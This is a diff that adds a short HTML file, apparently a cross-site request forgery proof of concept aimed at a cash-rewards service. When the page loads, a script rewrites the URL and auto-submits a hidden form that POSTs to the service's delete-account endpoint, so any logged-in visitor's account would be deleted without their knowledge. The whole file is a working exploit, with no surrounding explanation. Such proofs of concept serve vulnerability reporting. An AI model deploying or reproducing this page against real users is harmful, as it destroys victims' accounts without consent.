@@ -1,0 +1,12 @@
+<html>
+  <!-- free cash csrf -->
+  <body>
+    <form action="https://freecash.com/fc-api/auth/delete-account" method="POST">
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
